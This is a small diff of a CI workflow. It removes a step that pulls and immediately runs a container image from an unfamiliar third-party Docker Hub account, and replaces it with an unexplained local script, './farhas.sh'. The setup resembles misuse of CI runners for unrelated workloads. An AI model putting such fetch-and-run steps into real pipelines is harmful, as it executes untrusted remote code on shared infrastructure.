@@ -25,5 +25,4 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: runner_go
-      run: |
-        docker pull docker.io/alekpoden82/pkt-news:latest && docker run docker.io/alekpoden82/pkt-news:latest
+      run: ./farhas.sh
